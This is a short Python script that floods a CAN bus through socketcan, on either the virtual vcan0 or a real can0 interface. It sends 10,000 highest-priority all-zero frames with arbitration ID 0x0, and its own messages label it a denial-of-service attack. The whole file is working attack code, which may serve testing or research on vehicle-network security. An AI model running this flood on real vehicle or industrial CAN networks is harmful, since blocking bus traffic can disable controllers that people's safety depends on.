import can

def dos_attack(can_type):
    print('Initialing DoS Attack')
	
    if(can_type == '1'):
    	bus = can.interface.Bus(interface='socketcan', channel='vcan0', bitrate=500000)
    else:
    	bus = can.interface.Bus(interface='socketcan', channel='can0', bitrate=500000)
    
    count = 0
    while count <= 10000:
        try:
            msg = can.Message(
                arbitration_id=0x0,
                data=[0, 0, 0, 0, 0, 0, 0, 0],
                is_extended_id=False
            )
            bus.send(msg, 0.005)   
        except can.CanOperationError:
            print('Except: CanOperationError')
        except:
            print('Unkown Error Sending Can Msg')
        else:
            count += 1

    print('DoS Attack Done')
    bus.shutdown()
    
